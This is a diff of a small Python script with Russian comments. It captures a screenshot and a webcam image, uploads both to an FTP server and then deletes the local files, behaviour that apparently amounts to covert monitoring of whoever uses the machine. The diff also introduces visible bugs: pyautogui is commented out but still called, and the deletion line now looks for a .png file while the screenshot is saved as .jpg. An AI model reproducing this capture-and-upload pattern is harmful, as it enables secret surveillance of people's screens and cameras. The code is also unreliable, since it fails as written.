@@ -5,8 +5,6 @@
 import msvcrt
 import time
 import datetime
-import cv2     #чтоб cv2 заработало по виртуальным окружением вбей сие python -m pip install  opencv-python
-import pyautogui
 import os
 #словарь для подключения к ftp
 ftp_udifikashen = {
@@ -27,10 +25,12 @@ def otravka_na_ftp (): #отправляем изображения на ftp
         else:
                 print('Фото с вебкамеры отправлено')
     #Удаляем файл
-    for name_fail_scr_cam_del in ['scr_' + screenshotd + '.jpg', 'cam_' + screenshotd + '.png']:
+    for name_fail_scr_cam_del in ['scr_' + screenshotd + '.png', 'cam_' + screenshotd + '.png']:
         os.remove(name_fail_scr_cam_del)
 
 def skrin_and_campoto_name_dete (): #функция делает скриншот с экрана и присваевает именам файлов текщую дату
+    import cv2     #чтоб cv2 заработало по виртуальным окружением вбей сие python -m pip install  opencv-python
+    #import pyautogui
     #делаем скриншот с экрана
     screen = pyautogui.screenshot('scr_' + screenshotd + '.jpg')
     #Делаем снимок с камеры
